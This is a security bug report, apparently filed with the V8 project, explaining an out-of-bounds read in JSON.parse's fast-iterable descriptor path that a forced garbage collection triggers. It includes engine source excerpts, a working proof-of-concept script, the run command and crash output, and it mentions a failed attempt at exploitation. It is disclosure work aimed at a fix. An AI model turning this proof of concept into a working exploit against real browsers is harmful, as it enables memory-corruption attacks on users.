## Description

VULNERABILITY DETAILS

I will explain what happened in poc

### 1 prepare map transition

Firstly, `makeJson()` constructs the following map transition, where `map1` has the property `str`, `map2` has two properties: `str, f`, and `map1` and `map2` share the same `DescriptorArray`.

```
       map1
    +---------------+
    |   .....       |
    +---------------+                         instance_descriptors
    | descriptors(1)|------------------------> +------------+
    +---------------+                 +------> |  number... |
    |  transition   |----+            |        +------------+
    +---------------+    |            |        |key0: "str" |
                         |weak ref    |        |  details0  |
                         |"f"         |        |  value0    |
       map2              |            |        +------------+
    +---------------+ <--+            |        |key1: "f"   |
    |   .....       |                 |        |  details1  |
    +---------------+                 |        |  value0    |
    | descriptors(2)|-----------------+        +------------+
    +---------------+
    |  transition   |
    +---------------+

```

Even though the string generated by running `makeJson()` is the same each time, we still need to execute `JSON.stringify(arr)` because the `fast_iterable` flag in `instance_descriptors` will be set to `fast` during the serialization process.

```
bitfield struct DescriptorArrayFlags extends uint32 {
  fast_iterable: FastIterableState: 2 bit;    // <------ HERE
}

@generateBodyDescriptor
@generateUniqueMap
extern class DescriptorArray extends HeapObject {
  const number_of_all_descriptors: uint16;
  number_of_descriptors: uint16;
  // Raw GC state that is maintained during marking.
  // See `DescriptorArrayMarkingState`.
  raw_gc_state: uint32;
  flags: DescriptorArrayFlags;

  @if(TAGGED_SIZE_8_BYTES) optional_padding: uint32;
  @ifnot(TAGGED_SIZE_8_BYTES) optional_padding: void;

  enum_cache: EnumCache;
  descriptors[number_of_all_descriptors]: DescriptorEntry;
}

```
### 2 `ParseJsonArray()`

Objects in a JSON array usually have the same shape, so `ParseJsonArray()` has an optimization when parsing arrays: it uses the map of the previous object as feedback, hinting at the shape of the current object.

```
template <typename Char>
MaybeHandle<Object> JsonParser<Char>::ParseJsonArray() {
  // ...

  HandleScope handle_scope(isolate_);
  size_t start = element_stack_.size();
  // ...

  // Parse the first object in the array
  Handle<Object> value;
  if (V8_UNLIKELY(!ParseJsonValueRecursive().ToHandle(&value))) return {};
  element_stack_.emplace_back(value);

  // Continue parsing subsequent objects as long as there are commas
  while (Check(JsonToken::COMMA)) {
    // There is an assumption here: elements in the array have the same shape
    Handle<Map> feedback;
    if (IsJSObject(*value)) {    // The previous element is a JS object
      Tagged<Map> maybe_feedback = Cast<JSObject>(*value)->map();    // Get the object's map
      // If the map has been detached from the transition tree, don't use it
      if (!maybe_feedback->IsDetached(isolate_)) {
        feedback = handle(maybe_feedback, isolate_);
      }
    }
    // Parse the next element
    if (V8_UNLIKELY(!ParseJsonValueRecursive(feedback).ToHandle(&value))) {
      return {};
    }
    element_stack_.emplace_back(value);
  }
  // ...
}

```

Therefore, when processing the second object in the array(i.e.: `{"str":"BBBBBBBBBBBBBB","f":{}}`), it sets `feedback` to `map1`.

`ParseJsonValueRecursive()` will call `ParseJsonObject()` to parse the object after encountering `{`, and pass `feedback`.

```
template <typename Char>
V8_INLINE MaybeHandle<Object> JsonParser<Char>::ParseJsonValueRecursive(
    Handle<Map> feedback) {
  SkipWhitespace();
  switch (peek()) {
    case JsonToken::LBRACE:
      return ParseJsonObject(feedback);
    // ...
  }
}

```
### 3 `ParseJsonObject()`

`ParseJsonObject()` will choose different handling modes based on the `descriptors->fast_iterable()` flag. Since we have previously set it to `fast`, it will call `ParseJsonObjectProperties<FastIterableState::kJsonFast>()` for processing.

```
template <typename Char>
MaybeHandle<Object> JsonParser<Char>::ParseJsonObject(Handle<Map> feedback) {
  // ...

  if (!feedback.is_null()) {    // If feedback is provided
    Handle<DescriptorArray> descriptors =    // Get property descriptor array of hidden class
        handle(feedback->instance_descriptors(), isolate_);
    if (*descriptors == ReadOnlyRoots(isolate_).empty_descriptor_array()) {    // Property descriptor array is empty
      success = ParseJsonObjectProperties<FastIterableState::kJsonSlow>(
          &cont, first_token_msg, {});
    } else {
      switch (descriptors->fast_iterable()) {    // Process based on type of property descriptor array
        case FastIterableState::kJsonFast:
          success = ParseJsonObjectProperties<FastIterableState::kJsonFast>(
              &cont, first_token_msg, descriptors);
          break;
        case FastIterableState::kJsonSlow:
          success = ParseJsonObjectProperties<FastIterableState::kJsonSlow>(
              &cont, first_token_msg, {});
          break;
        case FastIterableState::kUnknown:
          success = ParseJsonObjectProperties<FastIterableState::kUnknown>(
              &cont, first_token_msg, descriptors);
          break;
      }
    }
  } else {
    // ...
  }
  // ...
}

```
### 4 `ParseJsonObjectProperties()`

This is the root cause of the vulnerability.

Firstly, **`ParseJsonObjectProperties()` caches the size of `descriptors`, here `nof_descriptors=2`**. Then when parsing the JSON object, it checks whether the field name in the JSON object matches the field name recorded in `descriptors`. The process is roughly as follows:

```
template <typename Char>
template <DescriptorArray::FastIterableState fast_iterable_state>
bool JsonParser<Char>::ParseJsonObjectProperties(
    JsonContinuation* cont, MessageTemplate first_token_msg,
    Handle<DescriptorArray> descriptors) {
  using FastIterableState = DescriptorArray::FastIterableState;
  if constexpr (fast_iterable_state == FastIterableState::kJsonSlow) {
    // ...
  } else {

    const uint16_t nof_descriptors = descriptors->number_of_descriptors();    // Cache the size of descriptors: 2
    InternalIndex idx{0};
    InternalIndex descriptors_end = InternalIndex{nof_descriptors};

    do {
      ExpectNext(JsonToken::STRING, first_token_msg);
      first_token_msg =
          MessageTemplate::kJsonParseExpectedDoubleQuotedPropertyName;
      bool key_match;
      if constexpr (fast_iterable_state == FastIterableState::kJsonFast) {
        uint32_t key_length;

        {
          DisallowGarbageCollection no_gc;
          Tagged<String> expected_key = Cast<String>(descriptors->GetKey(idx));    // Get the key of the idx-th property in the property descriptor table
          Tagged<Map> key_map = expected_key->map();    // Get the map of the property
          const uint8_t* expected_chars =    // Property name
              GetFastKeyChars(isolate_, expected_key, key_map, no_gc);
          key_length = expected_key->length();    // Get the length of the property
          key_match = FastKeyMatch(expected_chars, key_length);    // Check: whether the key in the property descriptor table of feedback matches the key in json
        }

        if (V8_LIKELY(key_match)) {    // Successful match, cache hit
          JsonString key = JsonString(position(), key_length, false, true, false);
          ++idx;
          cursor_ += key_length + 1 /* double quote */;
          if (V8_UNLIKELY(!ParseJsonPropertyValue(key))) return false;    // Parse the value of this field
        } else {
          // ...
        }
      } else {
        // ...
      }
    } while (idx < descriptors_end && Check(JsonToken::COMMA));
    // ...
  }

  return true;
}

```

The JSON object `{"str":"BBBBBBBBBBBBBB", "f":{}}` has two fields.

1. It will first match `"str"`, then call `descriptors->GetKey(0)` to check whether the field name in JSON is consistent with `descriptors`. If it is the same, it will call `ParseJsonPropertyValue(key)` to parse the property value.
2. Here the property value of JSON is `"BBBBBBBBBBBBBB"`, so it will call `MakeString()` to apply for a string object. Note: **Memory allocation will trigger GC**.
   1. `%SetAllocationTimeout(1, 2)` will precisely trigger a `major GC` when allocate a string object here.
   2. Since `map2` has no reference to it, `major GC` will attempt to clear the weak reference to `map2` in `map1` (that is, clear the `map transition` of `map1`).
   3. Clearing map transition will shrink the `DescriptorArray`, leaving only one element. Finally, `descriptors` is as follows.

```
       map1
    +---------------+
    |   .....       |
    +---------------+                         DescriptorArray
    | descriptors(1)|------------------------> +------------+
    +---------------+                          |  number... |
    |  transition   |                          +------------+
    +---------------+                          | key0: "str"|
                                               |  details0  |
                                               |  value0    |
                                               +------------+

```

3. At this point: **`ParseJsonObjectProperties()` does not know that `descriptors` has been shrunk, `nof_descriptors` is still `2`, thinking that there are two elements in it**. Therefore, when handling `"f": {}`, it will call `descriptors->GetKey(1)` to get the second key, leading to out-of-bounds access.

### 5 commit bisect

I believe the functionality with the vulnerability originates from this commit: `58c8508f30e84c9fa2be58ac9d7d3e85db45790c`.

Furthermore, I attempted to exploit the vulnerability but failed. This is because `DescriptorArray` is always adjacent to other objects, so when I try to access `key1` out of bounds, I get the `map` field of another object. However, I cannot confuse a `Map` with a `String` object, which always leads to a `SEGV_MAPERR` error. Perhaps there are other ways to exploit this vulnerability.

REPRODUCTION CASE

poc.js:

```
function makeJson() {
    // map1
    let o1 = { str: "A" };

    // map2
    // map transition: map1===>map2
    // map1 and map2 shared same instance_descriptors
    let o2 = { str: "BBBBBBBBBBBBBB" };
    o2.f = {};

    // Trigger optimization for JSON parsing arrays
    let arr = [o1,o2];
    
    // make instance_descriptors->fast_iterable change from unkonw to fast
    return JSON.stringify(arr);
}

/*
    [
        {
            "str":"A"
        },{
            "str":"BBBBBBBBBBBBBB",
            "f":{}
        }
    ]
*/
const json = makeJson();

/*
    interval = 1, timeout = 2
    Causes a Major GC to trigger when JSON.parse() creates a String object for "BBBBBBBBBBBBBB"
*/
%SetAllocationTimeout(1, 2);

/* 
    Trigger crash:
        1. After parsing {"str": "A"}, use `map1` as feedback to parse the second object
        2. ParseJsonObjectProperties() parses the JSON according to `map1->instance_descriptor`
            1. Caches the size of instance_descriptor: map1 shares a DescriptorArray, so it has two entries
            2. Gets the first key in instance_descriptor: `str`, checks if it matches the key in JSON
            3. On successful match, calls `MakeString()` to allocate an object for "BBBBBBBBBBBBBB", which triggers Major GC
            4. Since map2 has no references, this triggers TrimDescriptorArray() to shrink instance_descriptor to a single entry
            5. When processing the second JSON field, attempts to get the second key in instance_descriptor, causing out-of-bounds access
*/
JSON.parse(json);

```

run with debug compiled v8:

```
./d8 \
    --allow-natives-syntax \
    --stress-compaction \
    ./poc.js

```

v8 will crash like that:

```
#

# Debug check failed: descriptor_number.as_int() < number_of_descriptors() (1 vs. 1).
#

```
